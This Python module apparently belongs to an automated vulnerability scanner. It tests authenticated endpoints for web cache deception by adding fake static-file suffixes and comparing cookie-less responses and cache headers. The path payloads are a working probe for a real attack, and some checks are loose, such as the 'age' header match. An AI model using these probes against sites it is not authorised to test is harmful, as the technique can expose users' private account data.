import logging
import copy
from typing import List, Dict, Any, Optional

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.infra.network_client import AsyncNetworkClient

logger = logging.getLogger(__name__)

class WebCacheDeceptionSpecialist(Specialist):
    name = "WebCacheDeceptionSpecialist"
    description = "Checks for Web Cache Deception by appending static extensions to authenticated endpoints."
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.client = AsyncNetworkClient()

    async def execute(self, task: Task) -> List[Finding]:
        target_url = task.target
        findings = []
        
        # This specialist assumes it receives a URL to a sensitive authenticated endpoint
        # (e.g., /api/profile) and a session cookie.
        cookies = task.params.get("cookies", {}) if task.params else {}
        if not cookies:
            logger.info("[%s] No cookies provided; skipping Web Cache Deception test for %s", self.name, target_url)
            return findings

        # 1. Fetch with authentication to get base user info (e.g., email, account details)
        logger.info("[%s] Testing for WCD on %s", self.name, target_url)
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        auth_resp_text = ""
        try:
            auth_resp = await self.client.request("GET", target_url, headers=headers, cookies=cookies)
            auth_resp_text = auth_resp.text
            if not auth_resp_text or len(auth_resp_text) < 20:
                return findings
        except Exception as e:
            logger.error("[%s] Auth request failed: %s", self.name, e)
            return findings

        # Dummy extensions to trick CDNs
        extensions = [".css", ".js", ".png", ".jpg", ".txt"]
        delimiter = "/"
        
        # Check multiple payloads
        for ext in extensions:
            # Payloads like /api/profile/test.css or /api/profile;.css
            payload_urls = [
                f"{target_url}{delimiter}wcd_test{ext}",
                f"{target_url};wcd_test{ext}",
                f"{target_url}%3Bwcd_test{ext}"
            ]
            
            for test_url in payload_urls:
                try:
                    # 2. Access with Auth (to trick cache)
                    trick_resp = await self.client.request("GET", test_url, headers=headers, cookies=cookies)
                    # We need a cache indication ideally, but let's check unauth first
                    
                    # 3. Access without Auth
                    unauth_headers = copy.deepcopy(headers)
                    # Ensure no cookies and no cache-control bypass
                    unauth_headers["Cache-Control"] = "max-age=0"
                    
                    check_resp = await self.client.request("GET", test_url, headers=unauth_headers)
                    check_text = check_resp.text
                    
                    # If unauth response contains the sensitive data we saw in auth response
                    # (To do this perfectly, we'd need to exact-match context, but here we do a basic similarity or length check)
                    # For a robust PoC, we check if the response text is almost identical to the tricky response.
                    if check_resp.status == 200 and len(check_text) > 20 and trick_resp.text == check_text:
                        # Check for cache headers
                        cache_hit = False
                        for k, v in check_resp.headers.items():
                            kl = k.lower()
                            if "x-cache" in kl and "hit" in v.lower():
                                cache_hit = True
                            if "age" in kl:
                                cache_hit = True
                                
                        if cache_hit:
                            findings.append(Finding(
                                vuln_type=VulnType.MISCONFIGURATION,
                                severity=Severity.HIGH,
                                title=f"Web Cache Deception on {target_url}",
                                description=f"Authenticated content was cached after appending {ext} and could be retrieved via {test_url} without authentication.",
                                evidence=Evidence(
                                    request_url=test_url,
                                    response_body=check_text[:500]
                                ),
                                target_url=target_url,
                                source_agent=self.name,
                                tags=["web_cache_deception", "wcd"]
                            ))
                            break # Found for this URL, stop checking other extensions
                            
                except Exception as e:
                    logger.debug("[%s] WCD test failed for %s: %s", self.name, test_url, e)

        return findings
